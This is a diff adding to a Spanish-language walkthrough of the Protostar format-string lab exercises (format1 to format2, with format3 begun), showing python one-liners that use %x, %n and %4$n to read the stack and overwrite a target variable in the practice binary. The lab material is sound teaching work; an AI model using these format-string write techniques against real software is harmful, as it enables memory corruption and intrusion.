@@ -123,6 +123,7 @@ bffff488
 you have modified the target :)
 ```
   Y ya está, primer format completado.
+  
   **Entonces. ¿Que hemos hecho con todo esto?** Primero hemos observado el binario, la pila... Hemos visto que nos imprimía valores de esta al pasarle
   "%x" y que a cierto numero de estos, se muestra nuestro input. 
   Hemos sustituido un input random "AAAA" por la direccion de una varaible (target = \x38\x96\x04\x08)
@@ -136,5 +137,63 @@ you have modified the target :)
   
   **A nivel de código que hemos hecho?** Exactamente esto ->  ```printf("AAAA%n", &variable) -> varaible = "AAAA"```
   
-    
-   
+    ---------------------------------------------------------------------------
+## Escribir un número de bytes en una variable -> [format2](https://exploit.education/protostar/format-two/)
+
+Format2 no nos pide un argumento sino un input una vez ejecutado, la manera de pasarle dichi input por tanto cambia
+  
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%8x."*5)' | ./format2
+AAAA     200.b7fd8420.bffff524.41414141.2e783825.
+target is 0 :(
+```
+A diferencia del caso anterior, el offset es mucho menor, es decir nos imprime nuestro input de AAAA mucho antes.
+Si seguimos lo que hemos aprendido del primer format daremos con la conclusión de que la cuarta direccion que nos imprime (donde empiezan 
+las AAAA) es donde poner nuestra direccion de memoria y con la que escribir las "B" gracias al paráemtro "%n".
+
+Vamos a ver la dirección de la memoria que tenemos que sobreescribir
+```console
+[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format2 | grep "target"
+080496e4 g     O .bss	00000004              target
+```
+O sea: *\xe4\x96\x04\x08*
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"+ "%8x."*3 + "%x")' | ./format2
+B     200.b7fd8420.bffff524.80496e4
+target is 0 :(
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"+ "%8x."*3 + "%n")' | ./format2
+B     200.b7fd8420.bffff524.
+target is 32 :(
+```
+Hemos conseguido escribir en la variable. Pero ahora os introduciré dos comandos interesantes que nos abreviarán las cosas.
+> **"%4$n"** es escribe en el cuarto argumento (la cuarta dirección), lo que equivale a nuestro *"%8x."*3 + "%n"* de antes
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B" + "%4$n")' | ./format2
+B
+target is 5 :(
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "%4$n")' | ./format2
+�
+target is 4 :(
+```
+Es decir, de por sí escribe 4 bytes (5 si le metemos la "B"). Pero el ejecicio dice que nos tiene que salir "target = 64" O sea escribir 64 bytes.
+Si a 64 le restamos los 4 bytes, nos da 60, así que hay que meter 60 bytes.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"*60 + "%4$n")' | ./format2
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+you have modified the target :)
+```
+Esto tambíen se puede poner de otra forma, que es así:
+> **"%60d%4$n"**  escribe en el cuarto argumento 60 dígitos.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "%60d%4$n")' | ./format2
+                                                         512
+you have modified the target :)
+```
+    ---------------------------------------------------------------------------
+## Escribir un valor hexadecimal en una variable -> [format3](https://exploit.education/protostar/format-three/)
+
+
